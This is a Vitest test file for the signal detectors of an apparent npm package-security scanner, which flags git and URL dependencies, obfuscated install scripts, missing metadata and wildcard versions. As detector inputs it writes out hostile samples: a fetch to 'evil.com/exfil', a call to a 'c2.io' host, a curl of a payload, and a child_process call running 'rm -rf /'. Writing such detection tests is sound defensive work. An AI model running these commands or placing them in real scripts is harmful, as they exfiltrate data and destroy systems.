import { describe, it, expect } from 'vitest';
import {
  detectGitUrlDependency,
  detectUrlDependency,
  detectObfuscationInScript,
  detectMissingMetadata,
  detectWildcardVersion,
} from '../../../src/security/signals/base-signals.js';

const FILE = 'package.json';
const LANG = 'javascript';

describe('detectGitUrlDependency', () => {
  it('detects git+https URL', () => {
    const signal = detectGitUrlDependency(FILE, LANG, 'git+https://github.com/org/repo');
    expect(signal).not.toBeNull();
    expect(signal!.category).toBe('dependency-confusion');
    expect(signal!.type).toBe('git-url-dependency');
    expect(signal!.severity).toBe('high');
    expect(signal!.file).toBe(FILE);
    expect(signal!.language).toBe(LANG);
  });

  it('detects git@ URL', () => {
    const signal = detectGitUrlDependency(FILE, LANG, 'git@github.com:org/repo');
    expect(signal).not.toBeNull();
    expect(signal!.type).toBe('git-url-dependency');
  });

  it('detects git:// URL', () => {
    const signal = detectGitUrlDependency(FILE, LANG, 'git://github.com/org/repo');
    expect(signal).not.toBeNull();
  });

  it('returns null for normal semver version', () => {
    const signal = detectGitUrlDependency(FILE, LANG, '^4.18.0');
    expect(signal).toBeNull();
  });

  it('returns null for empty string', () => {
    expect(detectGitUrlDependency(FILE, LANG, '')).toBeNull();
  });
});

describe('detectUrlDependency', () => {
  it('detects direct http URL dependency', () => {
    const signal = detectUrlDependency(FILE, LANG, 'http://example.com/package.tgz');
    expect(signal).not.toBeNull();
    expect(signal!.category).toBe('dependency-confusion');
    expect(signal!.type).toBe('url-dependency');
    expect(signal!.severity).toBe('high');
  });

  it('detects direct https URL dependency', () => {
    const signal = detectUrlDependency(FILE, LANG, 'https://example.com/package.tgz');
    expect(signal).not.toBeNull();
    expect(signal!.type).toBe('url-dependency');
  });

  it('returns null for registry URLs (contains "registry")', () => {
    const signal = detectUrlDependency(FILE, LANG, 'https://registry.npmjs.org/express/-/express-4.18.0.tgz');
    expect(signal).toBeNull();
  });

  it('returns null for semver version string', () => {
    expect(detectUrlDependency(FILE, LANG, '^1.0.0')).toBeNull();
  });
});

describe('detectObfuscationInScript', () => {
  it('detects eval() usage', () => {
    const signals = detectObfuscationInScript(FILE, LANG, 'eval(data)');
    expect(signals.some(s => s.type === 'eval-usage')).toBe(true);
    expect(signals.find(s => s.type === 'eval-usage')!.severity).toBe('critical');
  });

  it('detects exec() usage', () => {
    const signals = detectObfuscationInScript(FILE, LANG, 'exec(cmd)');
    expect(signals.some(s => s.type === 'eval-usage')).toBe(true);
  });

  it('detects Function() constructor', () => {
    const signals = detectObfuscationInScript(FILE, LANG, 'new Function("return 1")');
    expect(signals.some(s => s.type === 'eval-usage')).toBe(true);
  });

  it('detects base64 encoding', () => {
    const signals = detectObfuscationInScript(FILE, LANG, 'const x = atob("abc123")');
    expect(signals.some(s => s.type === 'base64-encoding')).toBe(true);
    expect(signals.find(s => s.type === 'base64-encoding')!.severity).toBe('high');
  });

  it('detects Buffer.from base64', () => {
    const signals = detectObfuscationInScript(FILE, LANG, "Buffer.from(data, 'base64')");
    expect(signals.some(s => s.type === 'base64-encoding')).toBe(true);
  });

  it('detects network calls (fetch)', () => {
    const signals = detectObfuscationInScript(FILE, LANG, 'fetch("https://evil.com/exfil")');
    expect(signals.some(s => s.type === 'network-in-install')).toBe(true);
    expect(signals.find(s => s.type === 'network-in-install')!.severity).toBe('critical');
  });

  it('detects curl usage', () => {
    const signals = detectObfuscationInScript(FILE, LANG, 'curl https://example.com/payload');
    expect(signals.some(s => s.type === 'network-in-install')).toBe(true);
  });

  it('detects process.env access', () => {
    const signals = detectObfuscationInScript(FILE, LANG, 'process.env.SECRET');
    expect(signals.some(s => s.type === 'env-access')).toBe(true);
    expect(signals.find(s => s.type === 'env-access')!.severity).toBe('high');
  });

  it('detects child_process usage', () => {
    const signals = detectObfuscationInScript(FILE, LANG, "require('child_process').exec('rm -rf /')");
    expect(signals.some(s => s.type === 'shell-execution')).toBe(true);
    expect(signals.find(s => s.type === 'shell-execution')!.severity).toBe('critical');
  });

  it('returns empty array for clean script', () => {
    const signals = detectObfuscationInScript(FILE, LANG, 'echo hello');
    expect(signals).toHaveLength(0);
  });

  it('detects multiple signals in one script', () => {
    const signals = detectObfuscationInScript(FILE, LANG, "eval(atob('xyz')); fetch('http://c2.io')");
    expect(signals.length).toBeGreaterThanOrEqual(3);
  });
});

describe('detectMissingMetadata', () => {
  it('signals missing author when no author fields', () => {
    const signals = detectMissingMetadata(FILE, LANG, { name: 'foo', version: '1.0.0' });
    expect(signals.some(s => s.type === 'missing-author')).toBe(true);
    expect(signals.find(s => s.type === 'missing-author')!.severity).toBe('low');
  });

  it('signals missing repository when no url fields', () => {
    const signals = detectMissingMetadata(FILE, LANG, { name: 'foo', version: '1.0.0' });
    expect(signals.some(s => s.type === 'missing-repository')).toBe(true);
  });

  it('no signal when author is present', () => {
    const signals = detectMissingMetadata(FILE, LANG, {
      name: 'foo',
      author: 'Alice',
      repository: 'https://github.com/alice/foo',
    });
    expect(signals.some(s => s.type === 'missing-author')).toBe(false);
    expect(signals.some(s => s.type === 'missing-repository')).toBe(false);
  });

  it('no signal when maintainers array is present', () => {
    const signals = detectMissingMetadata(FILE, LANG, {
      maintainers: ['Alice'],
      homepage: 'https://foo.io',
    });
    expect(signals.some(s => s.type === 'missing-author')).toBe(false);
  });

  it('returns empty for fully-populated metadata', () => {
    const signals = detectMissingMetadata(FILE, LANG, {
      author: 'Alice',
      repository: 'https://github.com/alice/foo',
    });
    expect(signals).toHaveLength(0);
  });
});

describe('detectWildcardVersion', () => {
  it('detects wildcard "*" version', () => {
    const signal = detectWildcardVersion(FILE, LANG, 'express', '*');
    expect(signal).not.toBeNull();
    expect(signal!.type).toBe('wildcard-version');
    expect(signal!.severity).toBe('medium');
    expect(signal!.description).toContain('express');
  });

  it('detects "latest" version', () => {
    const signal = detectWildcardVersion(FILE, LANG, 'lodash', 'latest');
    expect(signal).not.toBeNull();
    expect(signal!.type).toBe('wildcard-version');
  });

  it('detects empty string version', () => {
    const signal = detectWildcardVersion(FILE, LANG, 'axios', '');
    expect(signal).not.toBeNull();
    expect(signal!.type).toBe('wildcard-version');
  });

  it('returns null for pinned semver version', () => {
    expect(detectWildcardVersion(FILE, LANG, 'express', '4.18.0')).toBeNull();
  });

  it('returns null for caret range version', () => {
    expect(detectWildcardVersion(FILE, LANG, 'express', '^4.18.0')).toBeNull();
  });
});
